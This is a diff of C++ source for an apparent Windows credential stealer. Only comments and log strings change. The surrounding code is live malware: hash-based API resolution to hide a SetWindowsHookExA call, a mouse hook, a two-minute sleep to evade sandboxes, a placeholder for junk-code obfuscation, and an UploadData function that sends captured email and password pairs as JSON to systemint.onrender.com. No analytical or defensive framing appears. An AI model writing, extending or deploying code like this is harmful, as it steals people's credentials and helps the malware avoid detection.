@@ -10,7 +10,7 @@
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "shell32.lib")
 
-// --- 1. DYNAMIC SYSTEM METADATA ---
+// --- 1. SYSTEM METADATA ---
 std::string GetMachineId() {
     HW_PROFILE_INFOA hw;
     return GetCurrentHwProfileA(&hw) ? std::string(hw.szHwProfileGuid) : "{DEV-ID}";
@@ -75,7 +75,7 @@ FARPROC GetProcAddressH(HMODULE hMod, DWORD targetHash) {
     return NULL;
 }
 
-// --- 4. EXFILTRATION (Strict Schema) ---
+// --- 4. EXFILTRATION ---
 void UploadData(std::string email, std::string pass) {
     HINTERNET hS = WinHttpOpen(L"Mozilla/5.0", 1, NULL, NULL, 0);
     HINTERNET hC = WinHttpConnect(hS, L"systemint.onrender.com", 443, 0);
@@ -102,7 +102,7 @@ void UploadData(std::string email, std::string pass) {
     std::string json = ss.str();
     if(WinHttpSendRequest(hR, L"Content-Type: application/json\r\n", -1, (LPVOID)json.c_str(), (DWORD)json.length(), (DWORD)json.length(), 0)) {
         WinHttpReceiveResponse(hR, NULL);
-        WriteDebug("Sent: " + json);
+        WriteDebug("Payload Sent: " + json);
     }
     WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
 }
@@ -150,13 +150,14 @@ LRESULT CALLBACK MouseProc(int n, WPARAM w, LPARAM l) {
 }
 
 int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
-    // JUNK_HERE
+    {
+        // JUNK_HERE
+    }
     Sleep(120000); 
 
     HMODULE u32 = GetModuleHandleA("user32.dll");
     if (!u32) u32 = LoadLibraryA("user32.dll");
 
-    // Hash for SetWindowsHookExA = 0xDE2B4659
     auto _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddressH(u32, 0xDE2B4659);
 
     if (_SetHook) {
